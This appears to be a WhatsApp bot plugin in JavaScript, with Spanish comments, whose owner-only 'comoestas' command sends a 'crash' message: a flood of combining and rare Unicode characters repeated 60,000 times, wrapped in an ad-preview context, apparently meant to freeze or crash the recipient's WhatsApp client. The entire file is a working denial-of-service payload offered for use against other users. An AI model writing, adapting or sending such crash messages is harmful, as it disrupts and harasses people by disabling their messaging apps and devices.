let handler = async (m, { conn }) => {
  // ✅ Verificar que el mensaje fue enviado por el propio bot
  if (!m.fromMe) return;

  let target = m.chat;
  let pushname = conn.getName(m.sender);

  try {
    await conn.sendMessage(m.chat, { text: "⏳ Enviando crash..." }, { quoted: m });

    await conn.sendMessage(target, {
      text: "🧪‌⃰Ꮡ‌‌" + "⛧ Zall :: CONCƱΣЯЯOR ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contextInfo: {
        externalAdReply: {
          title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
          body: `Haii ${pushname}`,
          previewType: "PHOTO",
          thumbnail: null,
          sourceUrl: "https://example.com/tama"
        }
      }
    }, { quoted: m });

    await conn.sendMessage(m.chat, { text: "✅ Crash enviado con éxito" }, { quoted: m });
  } catch (e) {
    await conn.sendMessage(m.chat, { text: "❌ Error al ejecutar crash:\n" + e.message }, { quoted: m });
  }
};

handler.command = ["comoestas"];
handler.rowner = true; // Esto ayuda a limitar a "real owner" (el bot)
export default handler;